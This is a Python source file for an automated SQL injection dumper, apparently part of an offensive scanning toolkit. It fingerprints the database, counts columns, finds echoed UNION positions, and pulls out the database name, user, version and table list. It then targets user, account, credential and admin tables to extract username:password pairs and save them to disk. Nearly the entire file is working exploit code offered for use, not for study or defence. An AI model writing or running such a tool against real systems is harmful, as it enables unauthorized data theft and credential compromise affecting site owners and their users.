"""sqli_dump v2 — full extraction: DBMS detect → columns → echo → dump"""
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from pathlib import Path
from core.http import HttpClient


DBMS_SIGNATURES = {
    "mysql":      ["mysql", "mariadb", "@@version", "information_schema"],
    "postgres":   ["postgresql", "pg_", "pg_sleep"],
    "mssql":      ["microsoft sql", "mssql", "@@version"],
    "oracle":     ["oracle", "ora-", "dual"],
    "sqlite":     ["sqlite", "sqlite_master"],
}

# Запросы для extraction — универсальные
EXTRACT_QUERIES = {
    "database": {
        "mysql":    "database()",
        "postgres": "current_database()",
        "mssql":    "db_name()",
        "oracle":   "(SELECT name FROM v$database)",
        "sqlite":   "''",
        "all":      "database()",
    },
    "user": {
        "mysql":    "current_user()",
        "postgres": "current_user",
        "mssql":    "system_user",
        "oracle":   "user",
        "sqlite":   "''",
        "all":      "current_user()",
    },
    "version": {
        "mysql":    "@@version",
        "postgres": "version()",
        "mssql":    "@@version",
        "oracle":   "(SELECT banner FROM v$version WHERE rownum=1)",
        "sqlite":   "sqlite_version()",
        "all":      "version()",
    },
    "tables": {
        "mysql":    "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())",
        "postgres": "(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')",
        "mssql":    "(SELECT STRING_AGG(name,',') FROM sys.tables)",
        "oracle":   "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)",
        "sqlite":   "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')",
    },
}

MARKER = "OMNI7x9z"


class SqliDump:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}
        http = HttpClient(session, logger)

        print(f"[sqli_dump v2] target: {target}")
        print(f"[sqli_dump v2] params: {list(params.keys())}")

        # 1. baseline
        base = http.get(target)
        if not base:
            print("[sqli_dump] no baseline")
            return {}

        base_len = len(base.content)
        print(f"[sqli_dump] baseline: {base.status_code} {base_len}b")
        print()

        # 2. для каждого param — найти рабочую инъекцию
        vuln = None
        for name in params:
            print(f"[param: {name}]")

            # 2.1 DBMS detection
            dbms = self._detect_dbms(http, u, params, name)
            print(f"  DBMS: {dbms}")

            # 2.2 column count via ORDER BY
            cols = self._find_columns_orderby(http, u, params, name)
            print(f"  columns (ORDER BY): {cols}")

            # 2.3 echo positions via UNION with marker
            if cols > 0:
                echo_pos = self._find_echo_positions(http, u, params, name, cols, base_len)
                print(f"  echo positions: {echo_pos}")
            else:
                echo_pos = []

            if cols > 0 and echo_pos:
                vuln = {
                    "param": name, "dbms": dbms,
                    "cols": cols, "echo": echo_pos,
                }
                break
            elif cols > 0:
                # union works but no echo — blind via time/boolean
                print(f"  union works (no echo) — fallback to blind")
                vuln = {"param": name, "dbms": dbms, "cols": cols, "echo": [], "blind": True}
                break

        if not vuln:
            print("[sqli_dump] no working injection found")
            return {"dumped": False}

        # 3. extraction
        print()
        print(f"[sqli_dump] extraction via {vuln['param']}")
        out_dir = Path("reports") / "dump" / "sqli"
        out_dir.mkdir(parents=True, exist_ok=True)
        results = {}

        if vuln["echo"]:
            # union + echo extraction
            for qname, per_dbms in EXTRACT_QUERIES.items():
                expr = per_dbms.get(vuln["dbms"]) or per_dbms.get("all")
                if not expr:
                    continue
                print(f"  [{qname}] extracting...", flush=True)
                val = self._union_extract(http, u, params, vuln["param"],
                                           vuln["cols"], vuln["echo"], expr, base_len)
                if val:
                    results[qname] = val
                    print(f"    ✓ {qname} = {val[:200]}")
                    logger.finding("sqli_dump", "critical", f"{qname}={val[:200]}")
                else:
                    print(f"    ✗ no data")

            # 3.1 dump users table если есть
            if "tables" in results:
                tables = results["tables"].split(",")
                for t in tables:
                    t = t.strip()
                    if any(k in t.lower() for k in ["user", "account", "credential", "password", "admin"]):
                        print(f"  [users from {t}] extracting...", flush=True)
                        val = self._union_extract(
                            http, u, params, vuln["param"], vuln["cols"], vuln["echo"],
                            f"(SELECT GROUP_CONCAT(username||':'||password) FROM {t})" if vuln["dbms"] == "mysql"
                            else f"(SELECT string_agg(username||':'||password,',') FROM {t})",
                            base_len,
                        )
                        if val:
                            results[f"data_{t}"] = val[:2000]
                            print(f"    ✓ {t}: {val[:200]}")
                            logger.finding("sqli_data", "critical", f"{t}={val[:200]}")

        # save
        if results:
            out_file = out_dir / f"dump_{int(time.time())}.txt"
            out_file.write_text("\n\n".join(f"=== {k} ===\n{v}" for k, v in results.items()))
            print(f"\n[sqli_dump] saved: {out_file}")

        return {"dumped": bool(results), "results": results, "vuln": vuln}

    def _detect_dbms(self, http, u, params, name):
        """Detect DBMS via error messages."""
        payloads = {
            "mysql":    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -",
            "postgres": "' AND CAST(version() AS int)-- -",
            "mssql":    "' AND 1=CONVERT(int,@@version)--",
            "oracle":   "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')--",
        }
        for dbms, p in payloads.items():
            r = http.get(self._url(u, params, name, p))
            if not r: continue
            low = r.text.lower()
            for sig in DBMS_SIGNATURES[dbms]:
                if sig in low:
                    return dbms
        return "mysql"  # default

    def _find_columns_orderby(self, http, u, params, name):
        """Binary detect column count via ORDER BY."""
        for n in range(1, 20):
            r = http.get(self._url(u, params, name, f"' ORDER BY {n}-- -"))
            if not r: break
            low = r.text.lower()
            if any(m in low for m in ["unknown column", "order by", "out of range",
                                        "sql syntax", "invalid column"]):
                return n - 1
        return 0

    def _find_echo_positions(self, http, u, params, name, cols, base_len):
        """Найти колонки, отражающиеся в ответе — через marker."""
        echo = []
        for i in range(cols):
            row = [f"'{MARKER}{i}'" if j == i else "NULL" for j in range(cols)]
            payload = f"' UNION SELECT {','.join(row)}-- -"
            r = http.get(self._url(u, params, name, payload))
            if not r: continue
            if f"{MARKER}{i}" in r.text:
                echo.append(i)
        return echo

    def _union_extract(self, http, u, params, name, cols, echo_positions, expr, base_len):
        """Extract value via union with echo position."""
        if not echo_positions:
            return None
        pos = echo_positions[0]
        row = [expr if j == pos else "NULL" for j in range(cols)]
        payload = f"' UNION SELECT {','.join(row)}-- -"
        r = http.get(self._url(u, params, name, payload))
        if not r: return None

        # extract from HTML: marker-based if we know context
        text = r.text
        # ищем длинные alphanumeric строки, отличающиеся от baseline
        candidates = re.findall(r"[A-Za-z0-9_.\-@:/,]{8,500}", text)
        base_candidates = set(re.findall(r"[A-Za-z0-9_.\-@:/,]{8,500}",
                                          http.get(u.geturl()).text if http.get(u.geturl()) else ""))
        new_candidates = [c for c in candidates if c not in base_candidates]

        # filter common html/script strings
        stopwords = {"function", "document", "window", "javascript", "if", "else",
                     "return", "var", "let", "const", "undefined", "null"}
        valid = [c for c in new_candidates if c.lower() not in stopwords and len(c) > 7]

        if valid:
            # самый длинный = наиболее вероятный data
            return max(valid, key=len)[:500]
        return None

    def _url(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
